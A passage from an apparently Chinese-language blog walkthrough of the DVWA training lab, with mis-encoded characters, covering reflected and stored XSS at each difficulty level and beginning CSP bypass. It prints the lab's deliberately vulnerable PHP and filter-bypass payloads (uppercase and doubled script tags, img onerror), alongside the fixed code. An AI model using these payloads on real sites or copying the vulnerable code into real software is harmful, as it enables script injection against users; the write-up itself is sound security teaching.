'&lt;/pre&gt;';}?&gt;</code></pre><p>array_key_exists() å‡½æ•°æ£€æŸ¥æŸä¸ªæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”®åï¼Œå¦‚æžœé”®åå­˜åœ¨åˆ™è¿”å›ž trueï¼Œå¦‚æžœé”®åä¸å­˜åœ¨åˆ™è¿”å›ž falseã€‚<strong>è¿™é‡Œé”®åä¸º</strong> <strong>name</strong></p><p>å¯ä»¥çœ‹åˆ°ï¼Œlowçº§åˆ«çš„ä»£ç åªæ˜¯åˆ¤æ–­äº†nameå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æžœä¸ä¸ºç©ºçš„è¯å°±ç›´æŽ¥æ‰“å°å‡ºæ¥ï¼Œå¹¶æ²¡æœ‰å¯¹nameå‚æ•°åšä»»ä½•çš„è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œå­˜åœ¨éžå¸¸æ˜Žæ˜¾çš„XSSæ¼æ´žã€‚</p><p>è¾“å…¥</p><pre><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre><p>å¾—åˆ°</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\XSS-reflect-Lowè¾“å…¥.png" alt="XSS-reflect-Lowè¾“å…¥"></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {//å°†è¾“å…¥ä¸­çš„&lt;script&gt;è½¬åŒ–ä¸ºç©º    $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );    // Feedback for end user    echo "&lt;pre&gt;Hello ${name}&lt;/pre&gt;";}?&gt;</code></pre><p>str_replace()å‡½æ•°ä¸å¤ªå®Œç¾Žï¼Œå› ä¸ºå®ƒåŒºåˆ†å¤§å°å†™</p><h4 id="1-å¤§å†™ç»•è¿‡"><a href="#1-å¤§å†™ç»•è¿‡" class="headerlink" title="1.å¤§å†™ç»•è¿‡"></a>1.å¤§å†™ç»•è¿‡</h4><pre><code>&lt;SCRIPT&gt;alert('xss')&lt;/SCRIPT&gt;</code></pre><h4 id="2-åŒå†™ç»•è¿‡"><a href="#2-åŒå†™ç»•è¿‡" class="headerlink" title="2.åŒå†™ç»•è¿‡"></a>2.åŒå†™ç»•è¿‡</h4><pre><code>&lt;sc&lt;script&gt;ript&gt;alert('xss')&lt;/script&gt;</code></pre><h4 id="3-æž„é€ ä¸ä½¿ç”¨"><a href="#3-æž„é€ ä¸ä½¿ç”¨" class="headerlink" title="3.æž„é€ ä¸ä½¿ç”¨"></a>3.æž„é€ ä¸ä½¿ç”¨</h4><pre><code>&lt;img src=1 onerror=alert('xss')&gt;he</code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpheader ("X-XSS-Protection: 0");if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { //ä½¿ç”¨é€šé…ç¬¦ï¼Œå®Œå…¨åŒ¹é…script*Nï¼Œæ‰€ä»¥æœ‰å…³scriptçš„æ ‡ç­¾å…¨è¢«è¿‡æ»¤    $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );    echo "&lt;pre&gt;Hello ${name}&lt;/pre&gt;";}?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œhighçº§åˆ«çš„ä»£ç ä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼ç›´æŽ¥æŠŠ &lt;*s*c*r*i*p*t ç»™è¿‡æ»¤äº†ï¼Œ* ä»£è¡¨ä¸€ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦ï¼Œi ä»£è¡¨ä¸åŒºåˆ†å¤§å°å†™ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬çš„<script>æ ‡ç­¾åœ¨è¿™é‡Œå°±ä¸èƒ½ç”¨äº†ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡imgã€bodyç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€…iframeç­‰æ ‡ç­¾çš„srcæ³¨å…¥æ¶æ„çš„jsä»£ç ã€‚</p><pre><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></pre><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input//è½¬ç &amp; ï¼ˆå’Œå·ï¼‰ æˆä¸º &amp;amp;&quot; ï¼ˆåŒå¼•å·ï¼‰ æˆä¸º &amp;quot;&#39; ï¼ˆå•å¼•å·ï¼‰ æˆä¸º &amp;#039;&lt; ï¼ˆå°äºŽï¼‰ æˆä¸º &amp;lt;&gt; ï¼ˆå¤§äºŽï¼‰ æˆä¸º &amp;gt;    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>**htmlspecialchars(string)**ï¼š</p><p>æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ â€œ&lt;â€ ï¼ˆå°äºŽï¼‰ã€ â€œ&gt;â€ ï¼ˆå¤§äºŽï¼‰ã€&amp; ã€â€˜â€™ã€â€œâ€ è½¬æ¢ä¸º HTML å®žä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´ ã€‚</p><p>å½“æˆ‘ä»¬è¾“å…¥ <script>alert('xss')</script> ï¼Œå› ä¸º htmlspecialchars å‡½æ•°ä¼šå°† &lt; å’Œ &gt; è½¬æ¢æˆhtmlå®žä½“,å¹¶ä¸”<em>n<strong>a</strong>m**e</em>å–çš„æ˜¯</p><p>nameçš„å€¼ï¼Œç„¶åŽåŒ…å›´åœ¨</p><pre></pre>æ ‡ç­¾ä¸­è¢«æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ’å…¥çš„è¯­å¥å¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚<p></p><h1 id="Stored-XSSï¼ˆå­˜å‚¨åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"><a href="#Stored-XSSï¼ˆå­˜å‚¨åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰" class="headerlink" title="Stored-XSSï¼ˆå­˜å‚¨åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰"></a>Stored-XSSï¼ˆå­˜å‚¨åž‹è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</h1><p>æ”»å‡»è€…äº‹å…ˆå°†æ¶æ„ä»£ç ä¸Šä¼ æˆ–å‚¨å­˜åˆ°æ¼æ´žæœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚è¿™å°±æ„å‘³ç€åªè¦è®¿é—®äº†è¿™ä¸ªé¡µé¢çš„è®¿å®¢ï¼Œéƒ½æœ‰å¯èƒ½ä¼šæ‰§è¡Œè¿™æ®µæ¶æ„è„šæœ¬ï¼Œå› æ­¤å‚¨å­˜åž‹XSSçš„å±å®³ä¼šæ›´å¤§ã€‚å› ä¸ºå­˜å‚¨åž‹XSSçš„ä»£ç å­˜åœ¨äºŽç½‘é¡µçš„ä»£ç ä¸­ï¼Œå¯ä»¥è¯´æ˜¯æ°¸ä¹…åž‹çš„ã€‚</p><p>å­˜å‚¨åž‹ XSS ä¸€èˆ¬å‡ºçŽ°åœ¨ç½‘ç«™ç•™è¨€ã€è¯„è®ºã€åšå®¢æ—¥å¿—ç­‰äº¤äº’å¤„ï¼Œæ¶æ„è„šæœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­ã€‚</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) {    // Get input// trim(string,charlist)å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œé¢„å®šä¹‰å­—ç¬¦åŒ…æ‹¬ã€\tã€\nã€\x0Bã€\rä»¥åŠç©ºæ ¼ï¼Œå¯é€‰å‚æ•°charlistæ”¯æŒæ·»åŠ é¢å¤–éœ€è¦åˆ é™¤çš„å­—ç¬¦ã€‚    $message = trim( $_POST[ 'mtxMessage' ] );    $name    = trim( $_POST[ 'txtName' ] );    // Sanitize message input// stripslashes(string)å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ã€‚    $message = stripslashes( $message );// mysql_real_escape_string(string,connection)å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œâ€˜ï¼Œâ€œï¼Œ\x1aï¼‰è¿›è¡Œè½¬ä¹‰ã€‚    $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitize name input    $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Update database    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );    //mysql_close();}?&gt;</code></pre><h4 id="trim-string-charlist"><a href="#trim-string-charlist" class="headerlink" title="trim(string,charlist)"></a><strong>trim(string,charlist)</strong></h4><p>å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œå¯é€‰å‚æ•°charlistæ”¯æŒæ·»åŠ é¢å¤–éœ€è¦åˆ é™¤çš„å­—ç¬¦ï¼Œå¦‚æžœè¢«çœç•¥ï¼Œåˆ™ç§»é™¤ä»¥ä¸‹æ‰€æœ‰å­—ç¬¦ï¼š</p><ul><li>â€œ\0â€ - NULL</li><li>â€œ\tâ€ - åˆ¶è¡¨ç¬¦</li><li>â€œ\nâ€ - æ¢è¡Œ</li><li>â€œ\x0Bâ€ - åž‚ç›´åˆ¶è¡¨ç¬¦</li><li>â€œ\râ€ - å›žè½¦</li><li>â€œ â€œ - ç©ºæ ¼</li></ul><h4 id="mysql-real-escape-string-string-connection"><a href="#mysql-real-escape-string-string-connection" class="headerlink" title="mysql_real_escape_string(string,connection)"></a><strong>mysql_real_escape_string(string,connection)</strong></h4><p>å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œâ€˜ï¼Œâ€œï¼Œ\x1aï¼‰è¿›è¡Œè½¬ä¹‰ã€‚</p><h4 id="stripslashes-string"><a href="#stripslashes-string" class="headerlink" title="stripslashes(string)"></a><strong>stripslashes(string)</strong></h4><p>å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¾“å…¥å¹¶æ²¡æœ‰åšXSSæ–¹é¢çš„è¿‡æ»¤ä¸Žæ£€æŸ¥ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æ˜Žæ˜¾çš„å­˜å‚¨åž‹XSSæ¼æ´žã€‚</p><p>messageä¸€æ è¾“å…¥<script>alert('xss')</script>ï¼Œ</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\XSS-stored-low1.png" alt="XSS-stored-low1"></p><p>ç”¨æˆ·åæ— æ³•ç›´æŽ¥åšXSSï¼Œå› ä¸ºå‰ç«¯ä»£ç æœ‰ç”¨æˆ·åé•¿åº¦é™åˆ¶</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\1375459-20200426184100977-925850173.png" alt="1375459-20200426184100977-925850173"></p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200426184441826-381338279.png" alt="img"></p><p>æˆ–è€…</p><p><img src="/2021/07/16/dvwa-xss/blog/source_posts\DVWAï¼šXSS\XSS-stored-low4.png" alt="XSS-stored-low4"></p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) {    $message = trim( $_POST[ 'mtxMessage' ] );    $name    = trim( $_POST[ 'txtName' ] );// strip_tags() å‡½æ•°å‰¥åŽ»å­—ç¬¦ä¸²ä¸­çš„HTMLã€XMLä»¥åŠPHPçš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨&lt;b&gt;æ ‡ç­¾    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $message = htmlspecialchars( $message );    $name = str_replace( '&lt;script&gt;', '', $name );    $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );?&gt;</code></pre><h4 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags()"></a><strong>strip_tags()</strong></h4><p>å‡½æ•°å‰¥åŽ»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨æ ‡ç­¾ã€‚</p><h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a><strong>htmlspecialchars()</strong></h4><p>å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®žä½“ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œç”±äºŽå¯¹messageå‚æ•°ä½¿ç”¨äº†htmlspecialcharså‡½æ•°è¿›è¡Œç¼–ç ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç ï¼Œä½†æ˜¯å¯¹äºŽnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†<script>ã€‚åŒåå°„åž‹XSSçš„Mediumçº§åˆ«ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§å†™æˆ–è€…åŒå†™ç»•è¿‡ã€‚</p><h4 id="1-å¤§å†™ç»•è¿‡-1"><a href="#1-å¤§å†™ç»•è¿‡-1" class="headerlink" title="1.å¤§å†™ç»•è¿‡"></a>1.å¤§å†™ç»•è¿‡</h4><pre><code>&lt;SCRIPT&gt;alert(&#39;xss&#39;)&lt;/SCRIPT&gt;</code></pre><h4 id="2-åŒå†™ç»•è¿‡-1"><a href="#2-åŒå†™ç»•è¿‡-1" class="headerlink" title="2.åŒå†™ç»•è¿‡"></a>2.åŒå†™ç»•è¿‡</h4><pre><code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();&#125;?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†<script>æ ‡ç­¾ï¼Œä½†æ˜¯å´å¿½ç•¥äº†imgã€iframeç­‰å…¶å®ƒå±é™©çš„æ ‡ç­¾ï¼Œå› æ­¤nameå‚æ•°ä¾æ—§å­˜åœ¨å­˜å‚¨åž‹XSSã€‚</p><pre><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></pre><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œimpossibleçº§åˆ«çš„ä»£ç ä½¿ç”¨htmlspecialcharså‡½æ•°å°†messageå’Œnameä¸­çš„é¢„å®šä¹‰å­—ç¬¦è½¬æ¢æˆhtmlå®žä½“ï¼Œè¿™æ ·å°±é˜²æ­¢äº†æˆ‘ä»¬å¡«å…¥æ ‡ç­¾ã€‚è€Œä¸”ä½¿ç”¨tokenæ¥é˜²èŒƒCSRFæ”»å‡»ï¼Œä½¿ç”¨PDOæŠ€æœ¯é˜²å¾¡SQLæ³¨å…¥ï¼Œè¿›ä¸€æ­¥æé«˜äº†å®‰å…¨æ€§ã€‚</p><h1 id="CSP-Bypassï¼ˆCSPç»•è¿‡ï¼‰"><a href="#CSP-Bypassï¼ˆCSPç»•è¿‡ï¼‰" class="headerlink" title="CSP Bypassï¼ˆCSPç»•è¿‡ï¼‰"></a>CSP Bypassï¼ˆCSPç»•è¿‡ï¼‰</h1><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>Content-Security-Policyæ˜¯æŒ‡HTTPè¿”å›žæŠ¥æ–‡å¤´ä¸­çš„æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šæ ¹æ®æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œåˆ¤æ–­å“ªäº›èµ„æºå¯ä»¥åŠ è½½æˆ–æ‰§è¡Œã€‚ç¿»è¯‘ä¸ºä¸­æ–‡å°±æ˜¯å†…å®¹å®‰å…¨ç­–ç•¥ã€‚æ˜¯ä¸ºäº†ç¼“è§£æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼ˆXSSï¼‰ï¼Œæµè§ˆå™¨çš„æ‰©å±•ç¨‹åºç³»ç»Ÿå¼•å…¥äº†å†…å®¹å®‰å…¨ç­–ç•¥è¿™ä¸ªæ¦‚å¿µã€‚åŽŸæ¥åº”å¯¹XSSæ”»å‡»æ—¶ï¼Œä¸»è¦é‡‡ç”¨å‡½æ•°è¿‡æ»¤ã€è½¬ä¹‰è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€æ ‡ç­¾ã€æ–‡æœ¬æ¥è§„é¿æ”»å‡»ã€‚CSPçš„å®žè´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘äººå‘˜æ˜Žç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚å¼€å‘è€…åªéœ€è¦æä¾›é…ç½®ï¼Œå®žçŽ°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆã€‚</p><p>ä¸¤ç§æ–¹æ³•å¯ä»¥å¯ç”¨CSPï¼š</p><ol><li>ä¸€ç§æ˜¯é€šè¿‡HTTPç›¸åº”å¤´ä¿¡æ¯çš„Content-Security-Policyå­—æ®µï¼›</li><li>å¦ä¸€ç§æ˜¯é€šè¿‡ç½‘é¡µæ ‡ç­¾ï¼›</li></ol><p>ä¾‹å¦‚ï¼š</p><meta http-equiv="Content-Security-Policy" content="script-src  'self'; object-src 'none'; style-src cdn.example.org third-party.org;  child-src https:"><p>ä»¥ä¸Šä¾‹å­çš„æ„æ€å¦‚ä¸‹ï¼š</p><ol><li>script-srcè„šæœ¬ï¼šåªä¿¡ä»»å½“å‰åŸŸå</li><li>object-srcï¼šä¸ä¿¡ä»»ä»»ä½•URLï¼Œå³ä¸åŠ è½½ä»»ä½•èµ„æº</li><li>style-srcæ ·å¼è¡¨ï¼šåªä¿¡ä»»<a href="http://cdn.example.orgå’Œhttp//third-party.org">http://cdn.example.orgå’Œhttp://third-party.org</a></li><li>child-srcï¼šå¿…é¡»ä½¿ç”¨HTTPSåè®®åŠ è½½ã€‚è¿™ä¸ªå·²ä»ŽWebæ ‡å‡†ä¸­åˆ é™¤ï¼Œæ–°ç‰ˆæœ¬æµè§ˆå™¨å¯èƒ½ä¸æ”¯æŒã€‚</li><li>å…¶ä»–èµ„æºï¼šæ²¡æœ‰é™åˆ¶å…¶ä»–èµ„æº</li></ol><p>å½“å¯ç”¨CSPåŽï¼Œä¸ç¬¦åˆCSPçš„å¤–éƒ¨èµ„æºä¼šè¢«é˜»æ­¢åŠ è½½ã€‚</p><p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨CSPå‘¢ï¼Ÿ</p><p>é¦–å…ˆï¼ŒCSPæ˜¯ä¸€ç§å£°æ˜Žæœºåˆ¶ï¼Œå…è®¸Webå¼€å‘è€…åœ¨å…¶åº”ç”¨ç¨‹åºä¸ŠæŒ‡å®šå¤šä¸ªå®‰å…¨é™åˆ¶ï¼Œç”±æ”¯æŒçš„ç”¨æˆ·ä»£ç†ï¼ˆæµè§ˆå™¨ï¼‰æ¥è´Ÿè´£å¼ºåˆ¶æ‰§è¡Œã€‚CSPæ—¨åœ¨â€œä½œä¸ºå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨çš„å·¥å…·ï¼Œä»¥å„ç§æ–¹å¼ä¿æŠ¤å…¶åº”ç”¨ç¨‹åºï¼Œå‡è½»å†…å®¹æ³¨å…¥æ¼æ´žçš„é£Žé™©å’Œå‡å°‘åº”ç”¨ç¨‹åºæ‰§è¡Œçš„ç‰¹æƒâ€ã€‚å½“å‰ï¼ŒCSPè¿˜å¤„åœ¨å¿«é€Ÿçš„å‘å±•æœŸï¼Œç›®å‰æ­£åœ¨è¿›è¡Œè§„èŒƒä¸­çš„ç‰ˆæœ¬æ˜¯CSP3ï¼ŒCSPæ ‡å‡†ç”±ç”¨æˆ·ä»£ç†é€‰æ‹©å®žçŽ°ã€‚ä¾‹å¦‚ï¼ŒChromeå…·æœ‰å®Œæ•´çš„CSP2æ”¯æŒï¼Œå¹¶ä¸”å®žçŽ°äº†CSP3çš„å¤§éƒ¨åˆ†å·¥ä½œè‰æ¡ˆï¼Œä»…åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½ä¼šè½åŽäºŽå®žéªŒä¸­çš„æŸäº›ç‰¹æ€§ï¼Œè€ŒMozilla  Firefoxå’ŒåŸºäºŽWebKitçš„æµè§ˆå™¨åˆ™åˆšåˆšèŽ·å¾—äº†å®Œæ•´çš„CSP2æ”¯æŒã€‚åœ¨å®žé™…ä½¿ç”¨ä¸­ï¼ŒCSPç­–ç•¥åœ¨Content-Security-Policy HTTPå“åº”å¤´æˆ–å…ƒç´ ä¸­æä¾›ã€‚</p><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php//script-srcè„šæœ¬ï¼š&#39;self&#39;åªä¿¡ä»»å½“å‰åŸŸå//ä¿¡ä»»https://pastebin.com ã€example.com code.jquery.comã€//https://ssl.google-analytics.com$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // alLows js from self, pastebin.com, jquery and google analytics.header($headerCSP);# https://pastebin.com/raw/R570EE00?&gt;&lt;?phpif (isset ($_POST[&#39;include&#39;])) &#123;$page[ &#39;body&#39; ] .= &quot;    &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;&quot;;&#125;$page[ &#39;body&#39; ] .= &#39;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#39;;</code></pre><p>å¯ä»¥çœ‹åˆ°è¢«ä¿¡ä»»çš„ç½‘ç«™æœ‰ï¼š<a href="https://pastebin.comã€example.comã€code.jquery.comå’Œhttps//ssl.google-analytics.com">https://pastebin.comã€example.comã€code.jquery.comå’Œhttps://ssl.google-analytics.com</a></p><p>å› æ­¤ï¼Œç»•è¿‡CSPçš„æ–¹æ³•å°±æ˜¯ï¼Œæ”»å‡»è€…æŠŠæ¶æ„ä»£ç 